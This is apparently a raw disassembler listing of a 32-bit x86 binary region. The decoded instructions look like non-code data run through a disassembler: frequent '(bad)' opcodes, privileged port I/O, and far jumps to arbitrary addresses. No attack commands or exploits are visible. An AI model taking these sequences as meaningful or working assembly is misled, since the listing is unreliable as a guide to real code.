  421807:	stos   DWORD PTR es:[edi],eax
  421808:	mov    esp,0x720841a5
  42180d:	retf   
  42180e:	rol    BYTE PTR [ebx+0x0],cl
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	sbb    DWORD PTR [edi],edx
  421882:	push   es
  421883:	repnz and BYTE PTR [ebp+0x1],ah
  421887:	add    BYTE PTR [ecx+eax*1],al
  42188a:	add    BYTE PTR [eax],al
  42188c:	popf   
  42188d:	fwait
  42188e:	jnp    0x42186e
  421890:	or     al,ch
  421892:	leave  
  421893:	or     DWORD PTR [ebp+0x663c1ff3],esi
  421899:	or     cl,ah
  42189b:	ins    DWORD PTR es:[edi],dx
  42189c:	pop    esp
  42189d:	out    0xa2,al
  42189f:	in     al,dx
  4218a0:	lods   al,BYTE PTR ds:[esi]
  4218a1:	push   eax
  4218a2:	cmp    eax,ebx
  4218a4:	sub    BYTE PTR [edi],0xb0
  4218a7:	mov    ecx,0x47d1bd4b
  4218ac:	xchg   edi,eax
  4218ad:	cli    
  4218ae:	pusha  
  4218af:	mov    bh,0xe3
  4218b1:	xchg   ebx,eax
  4218b2:	retf   
  4218b3:	imul   ebp
  4218b5:	mov    ds:0x4605f06a,al
  4218ba:	dec    edx
  4218bb:	add    al,0xf9
  4218bd:	loop   0x4218ca
  4218bf:	or     eax,0x924b7a98
  4218c4:	xchg   DWORD PTR [edx],esp
  4218c6:	inc    ebp
  4218c7:	rcl    BYTE PTR [ebx],0xad
  4218ca:	jo     0x4218b9
  4218cc:	fdivr  st,st(1)
  4218ce:	push   ebp
  4218cf:	lahf   
  4218d0:	jg     0x4218bc
  4218d2:	sar    ch,0xd4
  4218d5:	lahf   
  4218d6:	fisubr WORD PTR [ebx-0x13]
  4218d9:	stos   BYTE PTR es:[edi],al
  4218da:	jo     0x421905
  4218dc:	rsqrtps xmm4,xmm4
  4218df:	ficom  DWORD PTR [edi]
  4218e1:	mov    WORD PTR [esi+0x3c5bc48e],?
  4218e7:	clc    
  4218e8:	stos   DWORD PTR es:[edi],eax
  4218e9:	and    BYTE PTR [ebp+0x39692133],0x63
  4218f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218f1:	loopne 0x421952
  4218f3:	dec    edx
  4218f4:	or     BYTE PTR [esi-0x15],ah
  4218f7:	xchg   edi,eax
  4218f8:	adc    ebx,DWORD PTR [ebx-0x12]
  4218fb:	loopne 0x421932
  4218fd:	lods   al,BYTE PTR ds:[esi]
  4218fe:	jae    0x42190e
  421900:	sub    BYTE PTR [eax+0x17],0x5c
  421904:	jno    0x4218ad
  421906:	lahf   
  421907:	mov    ds:0x5161badc,eax
  42190c:	cmp    dh,BYTE PTR [esi+0x5]
  42190f:	call   0x2496cd69
  421914:	in     al,0x57
  421916:	mov    DWORD PTR [edi+0x43],ecx
  421919:	cdq    
  42191a:	dec    ebp
  42191b:	ds clc 
  42191d:	(bad)  
  42191f:	cs lahf 
  421921:	adc    esi,esp
  421923:	push   ebx
  421924:	mov    esi,ebp
  421926:	jge    0x4218b2
  421928:	or     DWORD PTR [ebx],0x6
  42192b:	xlat   BYTE PTR ds:[ebx]
  42192c:	jp     0x4218cc
  42192e:	(bad)  
  42192f:	jmp    0x8d9fce5d
  421934:	sbb    al,0x9e
  421936:	call   0xfd29:0x6e621f5b
  42193d:	enter  0xd9cd,0x27
  421941:	mov    dl,0x7e
  421943:	pop    ebx
  421944:	inc    eax
  421945:	jle    0x421979
  421947:	pusha  
  421948:	pop    esp
  421949:	mov    ebp,0xce74c7f0
  42194e:	pop    es
  42194f:	sbb    dl,BYTE PTR [esi-0x70ad7a69]
  421955:	adc    BYTE PTR [edi],dh
  421957:	xchg   DWORD PTR [edx-0x5b],edx
  42195a:	leave  
  42195b:	jl     0x421993
  42195d:	pop    esi
  42195e:	pop    es
  42195f:	jmp    0xa04fb4a6
  421964:	jmp    0x480d:0xf0d2a28f
  42196b:	add    al,0xe3
  42196d:	and    DWORD PTR [ecx],edx
  42196f:	sti    
  421970:	(bad)  
  421971:	mov    ds:0x6ca8897c,al
  421976:	mov    ch,0x83
  421978:	ja     0x421940
  42197a:	repnz call 0xf72c:0x13edd5a7
  421982:	ficom  DWORD PTR ds:0x975498cd
  421988:	ficom  WORD PTR [ecx-0x28]
  42198b:	inc    ebp
  42198c:	cwde   
  42198d:	fild   WORD PTR [ecx]
  42198f:	and    DWORD PTR [eax],eax
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	(bad)  
  421a01:	rcr    edi,1
  421a03:	jl     0x421a29
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	ret    
  421a0d:	push   edx
  421a0e:	and    al,0x4b
  421a10:	cdq    
  421a11:	ja     0x421a56
  421a13:	xor    BYTE PTR [eax],bh
  421a15:	(bad)  
  421a16:	ss es push esp
  421a19:	into   
  421a1a:	aas    
  421a1b:	icebp  
  421a1c:	adc    esp,DWORD PTR [ecx-0x6]
  421a1f:	adc    edi,ebx
  421a21:	mov    ebp,0xacb1210a
  421a26:	pop    ds
  421a27:	inc    eax
  421a28:	dec    ebx
  421a29:	enter  0x552f,0xb2
  421a2d:	iret   
  421a2e:	jae    0x421a64
  421a30:	mov    WORD PTR [ebx-0x22],cs
  421a33:	leave  
  421a34:	jp     0x4219fd
  421a36:	push   ebp
  421a37:	sbb    DWORD PTR [edi-0x80bbfdd],0xc6f433fa
  421a41:	nop
  421a42:	aaa    
  421a43:	in     eax,dx
  421a44:	fdivr  QWORD PTR [ebp+0x6b]
  421a47:	cwde   
  421a48:	mov    ebx,0x660c7c9c
  421a4d:	test   eax,0x2672e416
  421a52:	inc    ecx
  421a53:	mov    ah,0x72
  421a55:	js     0x4219de
  421a57:	mov    al,gs:0x824d56ea
  421a5d:	mov    ds:0x1c5df40f,al
  421a62:	int    0xd3
  421a64:	lods   eax,DWORD PTR ds:[esi]
  421a65:	fstp   QWORD PTR [ebx]
  421a67:	sbb    esp,esp
  421a69:	push   esi
  421a6a:	pusha  
  421a6b:	aad    0x94
  421a6d:	jb     0x421aa9
  421a6f:	xlat   BYTE PTR ds:[ebx]
  421a70:	es pop esp
  421a72:	sub    al,0x2c
  421a74:	push   ecx
  421a75:	jmp    0x131f:0x4c7c78fd
  421a7c:	xor    ah,al
  421a7e:	dec    ebp
  421a7f:	in     eax,0x4e
  421a81:	ds mov esp,0xba3c8dbf
  421a87:	add    esi,esi
  421a89:	dec    esp
  421a8a:	(bad)  
  421a8b:	xchg   edi,eax
  421a8c:	int3   
  421a8d:	xchg   ecx,eax
  421a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8f:	jle    0x421aff
  421a91:	sahf   
  421a92:	stos   BYTE PTR es:[edi],al
  421a93:	cmp    dl,BYTE PTR [edi]
  421a95:	repnz push 0xab8438fa
  421a9b:	stc    
  421a9c:	aad    0x8b
  421a9e:	pop    esi
  421a9f:	push   ds
  421aa0:	and    BYTE PTR [edx-0x545b2093],bh
  421aa6:	ja     0x421aa2
  421aa8:	ins    BYTE PTR es:[edi],dx
  421aa9:	push   esp
  421aaa:	repz xor ecx,esp
  421aad:	mov    ds:0xbd2a22f2,al
  421ab2:	push   ds
  421ab3:	jmp    DWORD PTR ds:0xff02447f
  421ab9:	daa    
  421aba:	jbe    0x421ab4
  421abc:	sbb    ebx,ebx
  421abe:	ds cwde 
  421ac0:	pushf  
  421ac1:	add    al,0x9
  421ac3:	fcmovne st,st(6)
  421ac5:	sbb    al,0x5e
  421ac7:	(bad)  
  421ac8:	out    dx,al
  421ac9:	inc    edx
  421aca:	imul   ebx,DWORD PTR [ecx+0x19],0xbd3aa78e
  421ad1:	(bad)  
  421ad2:	pop    ecx
  421ad3:	(bad)  
  421ad4:	xor    DWORD PTR [eax-0x8],0x7b
  421ad8:	mov    al,0x5
  421ada:	sets   BYTE PTR [eax+0x42]
  421ade:	mov    edx,esi
  421ae0:	pandn  mm6,QWORD PTR [ecx]
  421ae3:	fadd   DWORD PTR [edx-0x7d25a0bc]
  421ae9:	inc    ecx
  421aea:	mov    ecx,0x5550bda5
  421aef:	leave  
  421af0:	mov    ?,WORD PTR [esi]
  421af2:	sub    eax,0x2ab1b0ad
  421af7:	mov    al,0x62
  421af9:	inc    ebp
  421afa:	ss stos BYTE PTR es:[edi],al
  421afc:	mov    ah,0xae
  421afe:	sub    BYTE PTR [edx+0x53b2bba7],0x38
  421b05:	mov    BYTE PTR [eax-0x6d],dh
  421b08:	stos   DWORD PTR es:[edi],eax
  421b09:	dec    ebp
  421b0a:	or     BYTE PTR [edi+0x26],dl
  421b0d:	fadd   st(7),st
  421b0f:	into   
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     bl,bh
  421b81:	in     eax,0xca
  421b83:	mov    eax,ds:0x16728
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	lods   eax,DWORD PTR ds:[esi]
  421b8d:	inc    edx
  421b8e:	adc    eax,0xf45f1903
  421b93:	mov    bl,0x42
  421b95:	add    DWORD PTR [edi+ecx*8-0x14a6539c],eax
  421b9c:	retf   0xbb38
  421b9f:	sbb    eax,0x7162c05e
  421ba4:	stc    
  421ba5:	retf   0xccd6
  421ba8:	inc    edi
  421ba9:	dec    esi
  421baa:	jl     0x421bff
  421bac:	out    0x18,al
  421bae:	mov    ah,0xe6
  421bb0:	dec    ebp
  421bb1:	cmp    eax,0xe2082181
  421bb6:	add    dl,BYTE PTR [edi]
  421bb8:	mov    ds:0x8630265,al
  421bbd:	add    eax,0x9cc7bd33
  421bc2:	jnp    0x421be8
  421bc4:	dec    esi
  421bc5:	mov    cs,WORD PTR [edx]
  421bc7:	jno    0x421b7d
  421bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bca:	mov    edx,0x43527b02
  421bcf:	clc    
  421bd0:	dec    edx
  421bd1:	xchg   edi,eax
  421bd2:	arpl   WORD PTR [ecx-0x49cb3e60],ax
  421bd8:	int    0x59
  421bda:	xchg   esp,eax
  421bdb:	adc    al,ch
  421bdd:	xor    BYTE PTR [ebx-0x485fd6b1],cl
  421be3:	mov    ebx,0x8beca37
  421be8:	mov    fs,ebp
  421bea:	clc    
  421beb:	inc    ebx
  421bec:	xchg   ah,al
  421bee:	icebp  
  421bef:	cmp    al,0x16
  421bf1:	outs   dx,BYTE PTR ds:[esi]
  421bf2:	mov    eax,ds:0x8fb75217
  421bf7:	sbb    DWORD PTR [edi],ebp
  421bf9:	mov    ds:0xecee53d3,al
  421bfe:	mov    cl,0x9
  421c00:	fcom   st(7)
  421c02:	xor    eax,0x970f5344
  421c07:	shr    DWORD PTR es:[ebp+0x524d8cb0],0x26
  421c0f:	jp     0x421c38
  421c11:	pop    ebx
  421c12:	mov    WORD PTR [edi+ebp*4],?
  421c15:	xor    BYTE PTR [edx-0x51],bh
  421c18:	iret   
  421c19:	jnp    0x421c4f
  421c1b:	dec    edi
  421c1c:	mov    DWORD PTR [edi+0x35],ecx
  421c1f:	mov    dl,0x16
  421c21:	in     al,dx
  421c22:	enter  0x2421,0x27
  421c26:	sub    DWORD PTR [ecx-0x46],edx
  421c29:	pop    ss
  421c2a:	xchg   edi,eax
  421c2b:	push   0x28
  421c2d:	inc    edx
  421c2e:	cli    
  421c2f:	pop    edx
  421c30:	xor    DWORD PTR [eax+ebp*8],ebx
  421c33:	mov    dl,0x8
  421c35:	pop    ecx
  421c36:	xor    eax,0x9077e926
  421c3b:	jnp    0x421c7f
  421c3d:	nop
  421c3e:	push   es
  421c3f:	out    0xad,al
  421c41:	cmp    cl,BYTE PTR [edx+0x4b]
  421c44:	retf   
  421c45:	cs xor esp,edi
  421c48:	xchg   edx,eax
  421c49:	fiadd  WORD PTR [edi+0x2f]
  421c4c:	mov    eax,ds:0x77312710
  421c51:	je     0x421cc3
  421c53:	sub    eax,0xc50c1308
  421c58:	jbe    0x421c0d
  421c5a:	sti    
  421c5b:	retf   
  421c5c:	retf   
  421c5d:	popa   
  421c5e:	cmp    BYTE PTR [ebp+ebx*4-0x60],0x1d
  421c63:	and    DWORD PTR [ebp-0x32ef6252],ecx
  421c69:	fidivr WORD PTR ds:0x73cbf99a
  421c6f:	shr    al,0xfa
  421c72:	jnp    0x421c49
  421c74:	adc    DWORD PTR gs:[edi],ecx
  421c77:	outs   dx,BYTE PTR ds:[esi]
  421c78:	repz push eax
  421c7a:	pop    ebp
  421c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c7c:	mov    edi,0x7c467019
  421c81:	sub    edx,DWORD PTR [edi]
  421c83:	lea    edi,[ebp+0x61]
  421c86:	xchg   esi,eax
  421c87:	fldenv [edx+eax*2-0x2e]
  421c8b:	fst    DWORD PTR [edi+0xf0085e]
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	xchg   ebx,eax
  421d01:	aad    0x91
  421d03:	xor    al,0x2c
  421d05:	push   0x1040001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	je     0x421d12
  421d0e:	and    BYTE PTR [edx],ch
  421d10:	ins    DWORD PTR es:[edi],dx
  421d11:	mov    ecx,0xd759946d
  421d16:	inc    ecx
  421d17:	xchg   edi,eax
  421d18:	sbb    eax,0xd9d67da8
  421d1d:	push   cs
  421d1e:	adc    bh,dh
  421d20:	mov    bl,dh
  421d22:	xchg   edx,eax
  421d23:	pop    ebx
  421d24:	dec    esi
  421d25:	inc    edx
  421d26:	call   FWORD PTR [esi+eiz*8+0x3f]
  421d2a:	mov    ebp,0x8cd24a90
  421d2f:	js     0x421d31
  421d31:	push   ds
  421d32:	push   0xffffff99
  421d34:	mov    WORD PTR [eax-0x4b07f7ab],cs
  421d3a:	out    0x9e,al
  421d3c:	in     eax,0x29
  421d3e:	(bad)  
  421d3f:	xor    ah,BYTE PTR [edi-0xd]
  421d42:	les    ecx,FWORD PTR [esp]
  421d45:	jmp    0x8468bb71
  421d4a:	ret    0x174a
  421d4d:	or     cl,BYTE PTR [ebx+ebx*4+0x50]
  421d51:	sbb    BYTE PTR [edi],dh
  421d53:	mov    al,0x39
  421d55:	push   ds
  421d56:	in     al,0x23
  421d58:	jnp    0x421da6
  421d5a:	in     eax,dx
  421d5b:	js     0x421dd1
  421d5d:	mov    edx,0xa7cb63d9
  421d62:	lock dec edi
  421d64:	cmp    ch,bh
  421d66:	pop    ecx
  421d67:	pop    ss
  421d68:	mov    bl,dh
  421d6a:	mov    ebx,0x58be6440
  421d6f:	dec    ebx
  421d70:	dec    ebx
  421d71:	xchg   ecx,eax
  421d72:	packsswb mm7,QWORD PTR [edx]
  421d75:	mov    bl,BYTE PTR [edi-0x270eb75d]
  421d7b:	daa    
  421d7c:	cwde   
  421d7d:	aaa    
  421d7e:	stos   BYTE PTR es:[edi],al
  421d7f:	pusha  
  421d80:	adc    DWORD PTR [esi-0x10],ecx
  421d83:	xchg   BYTE PTR [esp+eax*1-0x6e20122a],ah
  421d8a:	and    al,0xe8
  421d8c:	rol    DWORD PTR [esi-0x3d],1
  421d8f:	cld    
  421d90:	icebp  
  421d91:	popf   
  421d92:	sbb    ebx,DWORD PTR [edi+0x14]
  421d95:	rcl    cl,1
  421d97:	popf   
  421d98:	imul   edx,DWORD PTR [ebx],0xbc96bd
  421d9e:	ins    DWORD PTR es:[edi],dx
  421d9f:	mov    eax,ds:0xd18509ab
  421da4:	sbb    ebp,DWORD PTR [edx+0x29]
  421da7:	add    al,0x78
  421da9:	es loopne 0x421d7f
  421dac:	dec    esp
  421dad:	data16 mov WORD PTR [bp+di],fs
  421db1:	xchg   DWORD PTR [edx],ebp
  421db3:	mov    dh,0x1a
  421db5:	in     al,dx
  421db6:	mov    edi,0x19fa8e5f
  421dbb:	jmp    0x421e2b
  421dbd:	arpl   di,bx
  421dbf:	push   esp
  421dc0:	inc    esi
  421dc1:	add    BYTE PTR [edx-0x6d],dh
  421dc4:	mov    eax,0xda4ca191
  421dc9:	lahf   
  421dca:	push   es
  421dcb:	mov    ds:0x1a169c07,al
  421dd0:	fisttp WORD PTR [ecx+0x78]
  421dd3:	xchg   esp,eax
  421dd4:	sbb    al,0xfe
  421dd6:	push   es
  421dd7:	stc    
  421dd8:	dec    edx
  421dd9:	sbb    eax,0x170fde
  421dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ddf:	jmp    0x252e:0xf94c17c8
  421de6:	cld    
  421de7:	jp     0x421d81
  421de9:	pop    ss
  421dea:	push   ebp
  421deb:	lea    ebx,[edi-0x1c]
  421dee:	or     al,0x5b
  421df0:	in     al,0xb3
  421df2:	pop    esi
  421df3:	imul   ebx,DWORD PTR [eax+0x24],0xc2c46b66
  421dfa:	leave  
  421dfb:	stos   DWORD PTR es:[edi],eax
  421dfc:	loop   0x421e04
  421dfe:	sbb    ebp,DWORD PTR [ebx]
  421e00:	dec    eax
  421e01:	jne    0x421e71
  421e03:	ja     0x421e3a
  421e05:	cld    
  421e06:	cmp    edi,DWORD PTR [ecx-0x3f1abeec]
  421e0c:	call   0x12342c3
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	add    BYTE PTR [edi+ebx*4],ch
  421e83:	iret   
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	add    ecx,DWORD PTR [eax-0xc]
  421e8f:	je     0x421ed1
  421e91:	test   DWORD PTR [ebx],0x8dbb5952
  421e97:	mov    DWORD PTR [ebx+esi*2],esp
  421e9a:	lods   al,BYTE PTR ds:[esi]
  421e9b:	pushf  
  421e9c:	mov    al,0xf7
  421e9e:	xor    esp,DWORD PTR [eax-0x10]
  421ea1:	cmp    esp,esp
  421ea3:	adc    eax,0xc60dad34
  421ea8:	(bad)  
  421ea9:	jmp    0x8ca0:0xbc7a83aa
  421eb0:	fsub   QWORD PTR [ebp+0x76]
  421eb3:	push   edx
  421eb4:	repz jmp 0x83c9:0xfdbaf9ac
  421ebc:	(bad)  
  421ebd:	outs   dx,DWORD PTR ds:[esi]
  421ebe:	push   es
  421ebf:	les    ebp,FWORD PTR [esi+0x2a4f867]
  421ec5:	sbb    ebp,edx
  421ec7:	es cmp edi,DWORD PTR ds:[ecx-0x3b]
  421ecc:	std    
  421ecd:	cmp    ch,BYTE PTR [ebp-0x54]
  421ed0:	popf   
  421ed1:	gs aas 
  421ed3:	adc    ebp,DWORD PTR ds:0xee32441d
  421ed9:	dec    edx
  421eda:	add    eax,0xca3c6772
  421edf:	mov    ah,0x5f
  421ee1:	in     al,0x62
  421ee3:	es stos DWORD PTR es:[edi],eax
  421ee5:	and    cl,bh
  421ee7:	and    BYTE PTR [edx-0x1a12be8],dl
  421eed:	mov    eax,ds:0x94e43c07
  421ef2:	shl    edx,0xd9
  421ef5:	int3   
  421ef6:	jge    0x421ed6
  421ef8:	jecxz  0x421ef0
  421efa:	sbb    eax,DWORD PTR [edx+0x75]
  421efd:	cli    
  421efe:	rol    BYTE PTR [ebx+0x55],cl
  421f01:	mov    dl,0x57
  421f03:	cdq    
  421f04:	sub    BYTE PTR [esi-0x76],dl
  421f07:	adc    bl,BYTE PTR [eax-0x4ee1154c]
  421f0d:	int    0xa8
  421f0f:	adc    BYTE PTR [edx-0xc],cl
  421f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f13:	rcl    DWORD PTR [ecx],cl
  421f15:	xor    DWORD PTR [ebp-0x74cc1a65],esp
  421f1b:	mov    WORD PTR [edi],?
  421f1d:	bound  eax,QWORD PTR [ebx+0x72131b30]
  421f23:	cmp    DWORD PTR [edx-0xd4bfb54],ecx
  421f29:	sbb    eax,ebx
  421f2b:	stos   BYTE PTR es:[edi],al
  421f2c:	push   ds
  421f2d:	js     0x421ef8
  421f2f:	mov    cl,0x19
  421f31:	dec    ebp
  421f32:	ror    BYTE PTR [edx],cl
  421f34:	mov    esp,0xa18014da
  421f39:	jecxz  0x421f86
  421f3b:	(bad)  
  421f3c:	in     eax,dx
  421f3d:	loopne 0x421fbb
  421f3f:	xchg   BYTE PTR [edx+esi*2-0x24],ah
  421f43:	and    DWORD PTR [edi],esi
  421f45:	loop   0x421fa4
  421f47:	(bad)  
  421f48:	jmp    0xf4ce3921
  421f4d:	leave  
  421f4e:	add    BYTE PTR [edx+0x32587b57],dh
  421f54:	xchg   cl,ch
  421f56:	shr    BYTE PTR [ebx],0xcf
  421f59:	mov    edi,eax
  421f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f5d:	mov    ds:0x29bb2283,eax
  421f62:	outs   dx,DWORD PTR ds:[esi]
  421f63:	sbb    DWORD PTR [ebp-0x4f07c75a],ebx
  421f69:	(bad)  
  421f6a:	or     DWORD PTR [edx+0x44],eax
  421f6d:	mov    WORD PTR [edx-0x50],fs
  421f70:	(bad)  
  421f71:	sbb    bl,BYTE PTR [edi+edi*4]
  421f74:	dec    ebp
  421f75:	mov    eax,ds:0x46cad41b
  421f7a:	(bad)  
  421f7b:	loop   0x421f06
  421f7d:	scas   al,BYTE PTR es:[edi]
  421f7e:	pusha  
  421f7f:	(bad)  
  421f80:	xchg   edx,eax
  421f81:	ins    BYTE PTR es:[edi],dx
  421f82:	jns    0x421f2d
  421f84:	and    eax,DWORD PTR [ebx+eax*1-0x37]
  421f88:	xchg   ebp,eax
  421f89:	add    ebx,DWORD PTR [eax+0x4bd1867b]
  421f8f:	pop    DWORD PTR [eax]
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	lods   ax,WORD PTR ds:[esi]
  422001:	in     eax,0x7
  422003:	call   0x104:0x16a34
  42200a:	add    BYTE PTR [eax],al
  42200c:	pop    ds
  42200d:	or     ch,bl
  42200f:	pop    ebx
  422010:	xlat   BYTE PTR ds:[ebx]
  422011:	call   FWORD PTR [ecx-0x58a21d6a]
  422017:	inc    ebx
  422018:	cmc    
  422019:	sub    ebx,DWORD PTR [esi+ebp*8-0x58]
  42201d:	sbb    al,0x8
  42201f:	cmp    al,0x64
  422021:	adc    ah,dl
  422023:	xchg   esp,eax
  422024:	loopne 0x422067
  422026:	rol    BYTE PTR [edi+0x1e140ab],0xeb
  42202d:	fwait
  42202e:	fwait
  42202f:	xchg   edi,eax
  422030:	fs sub ebp,ecx
  422033:	jnp    0x421fcc
  422035:	inc    DWORD PTR [esi-0x64]
  422038:	cld    
  422039:	call   0x8122:0xe5049ddb
  422040:	pop    ebx
  422041:	mov    dl,0x44
  422043:	retf   0x68ed
  422046:	daa    
  422047:	pop    cx
  422049:	(bad)  
  42204a:	(bad)  
  42204b:	popa   
  42204c:	sti    
  42204d:	addr16 int 0xdb
  422050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422051:	adc    DWORD PTR [esi+0x3ee1696e],edi
  422057:	in     eax,dx
  422058:	ja     0x422062
  42205a:	inc    ebx
  42205b:	fnsave [esi+0x6f]
  42205e:	je     0x4220ae
  422060:	pop    ecx
  422061:	dec    edi
  422062:	push   ecx
  422063:	fcomp  QWORD PTR [edi]
  422065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422066:	cmp    eax,0x66b1987e
  42206b:	inc    ebp
  42206c:	loop   0x422051
  42206e:	jo     0x422039
  422070:	int3   
  422071:	add    eax,0xca4ff02c
  422076:	arpl   WORD PTR [ebx],bx
  422078:	and    BYTE PTR [edx+edi*2+0x7722ffc],ch
  42207f:	cwde   
  422080:	sub    al,0xd8
  422082:	mov    dl,0xc
  422084:	call   0xe905:0x999f0313
  42208b:	cmp    al,0x86
  42208d:	and    DWORD PTR [ebp+0x28],esp
  422090:	test   al,0xe9
  422092:	xor    al,0xfc
  422094:	retf   0x2128
  422097:	(bad)  
  422098:	test   eax,0x59600996
  42209d:	inc    ecx
  42209e:	inc    edi
  42209f:	bound  edi,QWORD PTR [ebp+0x59]
  4220a2:	cmp    DWORD PTR [eax-0x45d0220c],edi
  4220a8:	inc    edx
  4220a9:	inc    dl
  4220ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ac:	das    
  4220ad:	or     eax,ecx
  4220af:	and    al,0x0
  4220b1:	retf   0xe41c
  4220b4:	pop    ss
  4220b5:	fs out dx,al
  4220b7:	call   0xe3d932ef
  4220bc:	(bad)  
  4220bd:	xlat   BYTE PTR ds:[ebx]
  4220be:	icebp  
  4220bf:	lahf   
  4220c0:	xor    al,0xd3
  4220c2:	sar    BYTE PTR [edx+0x7c082074],cl
  4220c8:	mov    eax,ds:0x4449130f
  4220cd:	push   cs
  4220ce:	repnz cmp al,0x6f
  4220d1:	pop    edi
  4220d2:	jae    0x42213a
  4220d4:	cmp    esp,DWORD PTR [ebx-0x39]
  4220d7:	aaa    
  4220d8:	jmp    0xf62e:0x8656fb82
  4220df:	xlat   BYTE PTR ds:[ebx]
  4220e0:	mov    eax,ds:0xa057d6f9
  4220e5:	ret    0x6646
  4220e8:	and    eax,0xba5d548d
  4220ed:	fwait
  4220ee:	or     DWORD PTR [eax],esp
  4220f0:	jecxz  0x4220ec
  4220f2:	mov    al,0x2e
  4220f4:	mov    dh,0x1a
  4220f6:	leave  
  4220f7:	ins    DWORD PTR es:[edi],dx
  4220f8:	loop   0x422088
  4220fa:	mov    ds:0xc7089544,al
  4220ff:	inc    ecx
  422100:	lods   al,BYTE PTR ds:[esi]
  422101:	jecxz  0x422163
  422103:	cwde   
  422104:	cmp    DWORD PTR [ebp+ebp*4-0x36],ebx
  422108:	sbb    ebx,DWORD PTR [ebp+0x46]
  42210b:	or     eax,0xb81410b0
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,DWORD PTR [eax+edx*8-0x4f]
  422183:	inc    edx
  422184:	cmp    BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	lock lock push es
  42218f:	inc    edx
  422190:	loope  0x4221cb
  422192:	sti    
  422193:	inc    edi
  422194:	retf   
  422195:	cvtps2pi mm2,QWORD PTR [esi]
  422198:	stc    
  422199:	jmp    0x42217f
  42219b:	js     0x422150
  42219d:	and    ecx,DWORD PTR [eax+0x664a1ad5]
  4221a3:	jo     0x42214f
  4221a5:	pop    eax
  4221a6:	es clc 
  4221a8:	test   DWORD PTR [edi-0x5a],esp
  4221ab:	mov    ch,0x12
  4221ad:	stc    
  4221ae:	not    BYTE PTR [esi+0x67]
  4221b1:	cmp    eax,eax
  4221b3:	outs   dx,BYTE PTR ds:[esi]
  4221b4:	cmp    al,0xb
  4221b6:	out    dx,al
  4221b7:	cmc    
  4221b8:	mov    ebp,0x48b4f014
  4221bd:	xor    esp,ebp
  4221bf:	neg    dl
  4221c1:	(bad)  
  4221c2:	jge    0x422180
  4221c4:	retf   0x3608
  4221c7:	les    ecx,FWORD PTR [esi]
  4221c9:	sbb    ecx,ebp
  4221cb:	and    al,0x5e
  4221cd:	jmp    0x4221f7
  4221cf:	lea    eax,[edx+0x4ff976f0]
  4221d5:	dec    esp
  4221d6:	mov    cl,0xc7
  4221d8:	and    eax,0xf3adc3a
  4221dd:	jg     0x42216c
  4221df:	xor    eax,0xc65af96c
  4221e4:	dec    edi
  4221e5:	outs   dx,DWORD PTR ds:[esi]
  4221e6:	int    0x76
  4221e8:	pop    esi
  4221e9:	popf   
  4221ea:	mov    esp,0xdf8f8015
  4221ef:	retf   0x1614
  4221f2:	pop    esi
  4221f3:	daa    
  4221f4:	in     eax,0x58
  4221f6:	xor    eax,0x66c30fba
  4221fb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221fd:	adc    dl,BYTE PTR [esp+ecx*4-0x27]
  422201:	js     0x42224c
  422203:	cli    
  422204:	jge    0x4221d3
  422206:	rol    DWORD PTR [edx],cl
  422208:	inc    edi
  422209:	jmp    0x42227c
  42220b:	xchg   edi,eax
  42220c:	cli    
  42220d:	mov    bl,0x32
  42220f:	jo     0x42219d
  422211:	cld    
  422212:	repnz in eax,0xa6
  422215:	or     BYTE PTR [esi-0x13],dh
  422218:	gs jo  0x4221bb
  42221b:	jbe    0x4221cb
  42221d:	cmp    eax,0x7539251e
  422222:	xor    BYTE PTR [eax+0x72],bl
  422225:	push   ebx
  422226:	pop    ss
  422227:	inc    ecx
  422228:	or     BYTE PTR [eax],cl
  42222a:	pop    ebx
